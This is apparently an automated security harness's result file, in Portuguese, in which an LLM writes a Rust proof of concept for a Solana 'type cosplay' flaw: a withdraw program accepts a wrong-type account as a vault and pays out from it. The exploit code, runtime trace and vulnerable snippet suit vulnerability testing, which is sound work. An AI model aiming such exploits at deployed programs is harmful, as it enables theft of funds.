@@ -1,0 +1,160 @@
+{
+  "category": "COSPLAY",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: saldo do vault cosplayado foi debitado (900000); recipient recebeu os lamports do vault cosplayado",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2589,
+        "completion_tokens": 1118,
+        "latency_s": 5.75
+      },
+      "raw": "{\n  \"plan\": \"O programa `withdraw` (Pinocchio) le o vault como um buffer cru: authority em [8..40] e balance em [40..48], sem discriminador de tipo. O baseline usa uma conta vault legitima (dono = program_id, layout com authority correta e saldo suficiente) e chama withdraw com sucesso. O ataque passa uma conta de outro tipo logico cujo layout de bytes coincide (mesmo dono, mesmos offsets), mas cujo discriminador de 8 bytes difere do vault legitimo, para que o programa a interprete como vault. O efeito medido e que o saldo da conta cosplayada foi debitado (bytes [40..48] reduzidos) e lamports transferidos ao recipient, provando que uma conta de tipo diferente foi aceita como vault.\",\n  \"scenario\": \"let program_id = env.program_id;\\n\\n// Conta vault legitima: dono = program_id, layout: [0..8] discriminador, [8..40] authority, [40..48] balance\\nlet authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\n\\nlet mut legit_data = vec![0u8; 48];\\nlegit_data[0..8].copy_from_slice(&[1u8, 2, 3, 4, 5, 6, 7, 8]);\\nlegit_data[8..40].copy_from_slice(authority.as_ref());\\nlegit_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\n\\nlet vault_legit = account(&program_id, &legit_data, Some(2_000_000));\\nlet authority_acc = wallet(1_000_000);\\nlet recipient_acc = wallet(1_000_000);\\n\\nlet mut ix_data = vec![0u8];\\nix_data.extend_from_slice(&100_000u64.to_le_bytes());\\n\\nlet metas = vec![\\n    AccountMeta::new(vault_legit_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\n\\n// Baseline: withdraw legitimo\\nlet baseline_ix = env.raw_ix(&ix_data, metas.clone());\\nlet baseline_accounts = vec![\\n    (vault_legit_key, vault_legit.clone()),\\n    (authority, authority_acc.clone()),\\n    (recipient, recipient_acc.clone()),\\n];\\nlet base = env.baseline(\\\"withdraw legitimo\\\", &baseline_ix, &baseline_accounts);\\n\\n// Ataque COSPLAY: conta de outro tipo logico com mesmo layout de bytes\\n// Discriminador diferente do vault legitimo, mas authority e balance nos mesmos offsets\\nlet mut cosplay_data = vec![0u8; 48];\\ncosplay_data[0..8].copy_from_slice(&[9u8, 9, 9, 9, 9, 9, 9, 9]); // discriminador diferente\\ncosplay_data[8..40].copy_from_slice(authority.as_ref());\\ncosplay_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\n\\nlet vault_cosplay_key = Pubkey::new_unique();\\nlet vault_cosplay = account(&program_id, &cosplay_data, Some(2_000_000));\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(vault_cosplay_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\nlet attack_ix = env.raw_ix(&ix_data, attack_metas);\\nlet attack_accounts = vec![\\n    (vault_cosplay_key, vault_cosplay.clone()),\\n    (authority, authority_acc.clone()),\\n    (recipient, recipient_acc.clone()),\\n];\\n\\nlet r = env.attack(\\\"cosplay: conta de outro tipo aceita como vault\\\", &attack_ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let vault_after = after(&r, &vault_cosplay_key);\\n    let recipient_after = after(&r, &recipient);\\n    let new_balance = read_u64(vault_after.data(), 40);\\n    env.effect(\\n        \\\"saldo do vault cosplayado foi debitado (900000)\\\",\\n        new_balance == 900_000,\\n    );\\n    env.effect(\\n        \\\"recipient recebeu os lamports do vault cosplayado\\\",\\n        recipient_after.lamports() == 1_100_000,\\n    );\\n}\\n\"\n}",
+      "plan": "O programa `withdraw` (Pinocchio) le o vault como um buffer cru: authority em [8..40] e balance em [40..48], sem discriminador de tipo. O baseline usa uma conta vault legitima (dono = program_id, layout com authority correta e saldo suficiente) e chama withdraw com sucesso. O ataque passa uma conta de outro tipo logico cujo layout de bytes coincide (mesmo dono, mesmos offsets), mas cujo discriminador de 8 bytes difere do vault legitimo, para que o programa a interprete como vault. O efeito medido e que o saldo da conta cosplayada foi debitado (bytes [40..48] reduzidos) e lamports transferidos ao recipient, provando que uma conta de tipo diferente foi aceita como vault.",
+      "scenario": "let program_id = env.program_id;\n\n// Conta vault legitima: dono = program_id, layout: [0..8] discriminador, [8..40] authority, [40..48] balance\nlet authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\n\nlet mut legit_data = vec![0u8; 48];\nlegit_data[0..8].copy_from_slice(&[1u8, 2, 3, 4, 5, 6, 7, 8]);\nlegit_data[8..40].copy_from_slice(authority.as_ref());\nlegit_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\n\nlet vault_legit = account(&program_id, &legit_data, Some(2_000_000));\nlet authority_acc = wallet(1_000_000);\nlet recipient_acc = wallet(1_000_000);\n\nlet mut ix_data = vec![0u8];\nix_data.extend_from_slice(&100_000u64.to_le_bytes());\n\nlet metas = vec![\n    AccountMeta::new(vault_legit_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\n\n// Baseline: withdraw legitimo\nlet baseline_ix = env.raw_ix(&ix_data, metas.clone());\nlet baseline_accounts = vec![\n    (vault_legit_key, vault_legit.clone()),\n    (authority, authority_acc.clone()),\n    (recipient, recipient_acc.clone()),\n];\nlet base = env.baseline(\"withdraw legitimo\", &baseline_ix, &baseline_accounts);\n\n// Ataque COSPLAY: conta de outro tipo logico com mesmo layout de bytes\n// Discriminador diferente do vault legitimo, mas authority e balance nos mesmos offsets\nlet mut cosplay_data = vec![0u8; 48];\ncosplay_data[0..8].copy_from_slice(&[9u8, 9, 9, 9, 9, 9, 9, 9]); // discriminador diferente\ncosplay_data[8..40].copy_from_slice(authority.as_ref());\ncosplay_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\n\nlet vault_cosplay_key = Pubkey::new_unique();\nlet vault_cosplay = account(&program_id, &cosplay_data, Some(2_000_000));\n\nlet attack_metas = vec![\n    AccountMeta::new(vault_cosplay_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\nlet attack_ix = env.raw_ix(&ix_data, attack_metas);\nlet attack_accounts = vec![\n    (vault_cosplay_key, vault_cosplay.clone()),\n    (authority, authority_acc.clone()),\n    (recipient, recipient_acc.clone()),\n];\n\nlet r = env.attack(\"cosplay: conta de outro tipo aceita como vault\", &attack_ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let vault_after = after(&r, &vault_cosplay_key);\n    let recipient_after = after(&r, &recipient);\n    let new_balance = read_u64(vault_after.data(), 40);\n    env.effect(\n        \"saldo do vault cosplayado foi debitado (900000)\",\n        new_balance == 900_000,\n    );\n    env.effect(\n        \"recipient recebeu os lamports do vault cosplayado\",\n        recipient_after.lamports() == 1_100_000,\n    );\n}\n",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0425]: cannot find value `vault_legit_key` in this scope\n  --> tests/attempt.rs:28:26\n   |\n28 |         AccountMeta::new(vault_legit_key, false),\n   |                          ^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n28 -         AccountMeta::new(vault_legit_key, false),\n28 +         AccountMeta::new(vault_legit, false),\n   |\n\nerror[E0425]: cannot find value `vault_legit_key` in this scope\n  --> tests/attempt.rs:36:10\n   |\n36 |         (vault_legit_key, vault_legit.clone()),\n   |          ^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n36 -         (vault_legit_key, vault_legit.clone()),\n36 +         (vault_legit, vault_legit.clone()),\n   |\n\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0425]: cannot find value `vault_legit_key` in this scope\n  --> tests/attempt.rs:28:26\n   |\n28 |         AccountMeta::new(vault_legit_key, false),\n   |                          ^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n28 -         AccountMeta::new(vault_legit_key, false),\n28 +         AccountMeta::new(vault_legit, false),\n   |\n\nerror[E0425]: cannot find value `vault_legit_key` in this scope\n  --> tests/attempt.rs:36:10\n   |\n36 |         (vault_legit_key, vault_legit.clone()),\n   |          ^^^^^^^^^^^^^^^\n   |\nhelp: a local variable with a similar name exists\n   |\n36 -         (vault_legit_key, vault_legit.clone()),\n36 +         (vault_legit, vault_legit.clone()),\n   |\n\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3704,
+        "completion_tokens": 984,
+        "latency_s": 4.09
+      },
+      "raw": "{\"plan\": \"Preparo uma conta vault legitima (dono = program_id, layout [0..8] discriminador, [8..40] authority, [40..48] balance) e executo um withdraw legitimo como baseline. Em seguida, ataco passando uma conta de outro tipo logico (discriminador diferente) mas com o mesmo layout de bytes nos offsets esperados, mantendo a mesma authority. Se o programa aceitar, o saldo da conta cosplayada sera debitado e o recipient recebera os lamports, demonstrando o type cosplay.\", \"scenario\": \"let program_id = env.program_id;\\n\\nlet authority = Pubkey::new_unique();\\nlet recipient = Pubkey::new_unique();\\n\\nlet mut legit_data = vec![0u8; 48];\\nlegit_data[0..8].copy_from_slice(&[1u8, 2, 3, 4, 5, 6, 7, 8]);\\nlegit_data[8..40].copy_from_slice(authority.as_ref());\\nlegit_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\n\\nlet vault_legit_key = Pubkey::new_unique();\\nlet vault_legit = account(&program_id, &legit_data, Some(2_000_000));\\nlet authority_acc = wallet(1_000_000);\\nlet recipient_acc = wallet(1_000_000);\\n\\nlet mut ix_data = vec![0u8];\\nix_data.extend_from_slice(&100_000u64.to_le_bytes());\\n\\nlet metas = vec![\\n    AccountMeta::new(vault_legit_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\n\\nlet baseline_ix = env.raw_ix(&ix_data, metas.clone());\\nlet baseline_accounts = vec![\\n    (vault_legit_key, vault_legit.clone()),\\n    (authority, authority_acc.clone()),\\n    (recipient, recipient_acc.clone()),\\n];\\nlet _base = env.baseline(\\\"withdraw legitimo\\\", &baseline_ix, &baseline_accounts);\\n\\nlet mut cosplay_data = vec![0u8; 48];\\ncosplay_data[0..8].copy_from_slice(&[9u8, 9, 9, 9, 9, 9, 9, 9]);\\ncosplay_data[8..40].copy_from_slice(authority.as_ref());\\ncosplay_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\\n\\nlet vault_cosplay_key = Pubkey::new_unique();\\nlet vault_cosplay = account(&program_id, &cosplay_data, Some(2_000_000));\\n\\nlet attack_metas = vec![\\n    AccountMeta::new(vault_cosplay_key, false),\\n    AccountMeta::new_readonly(authority, true),\\n    AccountMeta::new(recipient, false),\\n];\\nlet attack_ix = env.raw_ix(&ix_data, attack_metas);\\nlet attack_accounts = vec![\\n    (vault_cosplay_key, vault_cosplay.clone()),\\n    (authority, authority_acc.clone()),\\n    (recipient, recipient_acc.clone()),\\n];\\n\\nlet r = env.attack(\\\"cosplay: conta de outro tipo aceita como vault\\\", &attack_ix, &attack_accounts);\\n\\nif r.program_result == ProgramResult::Success {\\n    let vault_after = after(&r, &vault_cosplay_key);\\n    let recipient_after = after(&r, &recipient);\\n    let new_balance = read_u64(vault_after.data(), 40);\\n    env.effect(\\n        \\\"saldo do vault cosplayado foi debitado (900000)\\\",\\n        new_balance == 900_000,\\n    );\\n    env.effect(\\n        \\\"recipient recebeu os lamports do vault cosplayado\\\",\\n        recipient_after.lamports() == 1_100_000,\\n    );\\n}\\n\"}",
+      "plan": "Preparo uma conta vault legitima (dono = program_id, layout [0..8] discriminador, [8..40] authority, [40..48] balance) e executo um withdraw legitimo como baseline. Em seguida, ataco passando uma conta de outro tipo logico (discriminador diferente) mas com o mesmo layout de bytes nos offsets esperados, mantendo a mesma authority. Se o programa aceitar, o saldo da conta cosplayada sera debitado e o recipient recebera os lamports, demonstrando o type cosplay.",
+      "scenario": "let program_id = env.program_id;\n\nlet authority = Pubkey::new_unique();\nlet recipient = Pubkey::new_unique();\n\nlet mut legit_data = vec![0u8; 48];\nlegit_data[0..8].copy_from_slice(&[1u8, 2, 3, 4, 5, 6, 7, 8]);\nlegit_data[8..40].copy_from_slice(authority.as_ref());\nlegit_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\n\nlet vault_legit_key = Pubkey::new_unique();\nlet vault_legit = account(&program_id, &legit_data, Some(2_000_000));\nlet authority_acc = wallet(1_000_000);\nlet recipient_acc = wallet(1_000_000);\n\nlet mut ix_data = vec![0u8];\nix_data.extend_from_slice(&100_000u64.to_le_bytes());\n\nlet metas = vec![\n    AccountMeta::new(vault_legit_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\n\nlet baseline_ix = env.raw_ix(&ix_data, metas.clone());\nlet baseline_accounts = vec![\n    (vault_legit_key, vault_legit.clone()),\n    (authority, authority_acc.clone()),\n    (recipient, recipient_acc.clone()),\n];\nlet _base = env.baseline(\"withdraw legitimo\", &baseline_ix, &baseline_accounts);\n\nlet mut cosplay_data = vec![0u8; 48];\ncosplay_data[0..8].copy_from_slice(&[9u8, 9, 9, 9, 9, 9, 9, 9]);\ncosplay_data[8..40].copy_from_slice(authority.as_ref());\ncosplay_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());\n\nlet vault_cosplay_key = Pubkey::new_unique();\nlet vault_cosplay = account(&program_id, &cosplay_data, Some(2_000_000));\n\nlet attack_metas = vec![\n    AccountMeta::new(vault_cosplay_key, false),\n    AccountMeta::new_readonly(authority, true),\n    AccountMeta::new(recipient, false),\n];\nlet attack_ix = env.raw_ix(&ix_data, attack_metas);\nlet attack_accounts = vec![\n    (vault_cosplay_key, vault_cosplay.clone()),\n    (authority, authority_acc.clone()),\n    (recipient, recipient_acc.clone()),\n];\n\nlet r = env.attack(\"cosplay: conta de outro tipo aceita como vault\", &attack_ix, &attack_accounts);\n\nif r.program_result == ProgramResult::Success {\n    let vault_after = after(&r, &vault_cosplay_key);\n    let recipient_after = after(&r, &recipient);\n    let new_balance = read_u64(vault_after.data(), 40);\n    env.effect(\n        \"saldo do vault cosplayado foi debitado (900000)\",\n        new_balance == 900_000,\n    );\n    env.effect(\n        \"recipient recebeu os lamports do vault cosplayado\",\n        recipient_after.lamports() == 1_100_000,\n    );\n}\n",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "withdraw legitimo",
+            "result": "Success",
+            "compute_units": 388,
+            "account_flags": "-w,sr,-w",
+            "ix_head": "00a0860100000000",
+            "accounts": [
+              {
+                "key": "11111112cMQwSC9qirWGjZM6gLGwW69X22mqwLLGP",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "0102030405060708",
+                "digest": "8f88c195b6489947",
+                "post": "01020304050607080000000000000002000000000000000000000000000000000000000000000000a0bb0d0000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "cosplay: conta de outro tipo aceita como vault",
+            "result": "Success",
+            "compute_units": 388,
+            "account_flags": "-w,sr,-w",
+            "ix_head": "00a0860100000000",
+            "accounts": [
+              {
+                "key": "111111131h1vYVSYuKP6AhS86fbRdMw9XHiZAvAaj",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 48,
+                "head": "0909090909090909",
+                "digest": "8745c3f54ad8ffd9",
+                "post": "09090909090909090000000000000002000000000000000000000000000000000000000000000000a0bb0d0000000000"
+              },
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": false,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              },
+              {
+                "key": "11111112D1oxKts8YPdTJRG5FzxTNpMtWmq8hkVx3",
+                "signer": false,
+                "writable": true,
+                "owner": "11111111111111111111111111111111",
+                "data_len": 0,
+                "head": "",
+                "digest": "e3b0c44298fc1c14",
+                "post": ""
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "saldo do vault cosplayado foi debitado (900000)",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "recipient recebeu os lamports do vault cosplayado",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 388 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 388 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: saldo do vault cosplayado foi debitado (900000); recipient recebeu os lamports do vault cosplayado"
+    }
+  ],
+  "case_id": "SSP-01-P-V",
+  "static_finding": {
+    "category": "COSPLAY",
+    "confidence": "medium",
+    "evidence": "let vault_data = vault.try_borrow_data()?;\nlet stored_authority = read_pubkey(&vault_data[8..40]);\nlet balance = u64::from_le_bytes(vault_data[40..48]...);",
+    "explanation": "Nao ha verificacao de um discriminador de tipo no inicio do buffer antes de interpretar os bytes como um vault. Qualquer conta com layout compativel (mesmo pertencente a outro tipo logico) pode ser passada como vault, configurando type cosplay.",
+    "attack_hypothesis": "Um atacante fornece uma conta de outro tipo cujo layout de bytes coincide com o esperado para o vault, fazendo o programa interpretar dados de um tipo diferente como se fossem o vault."
+  }
+}
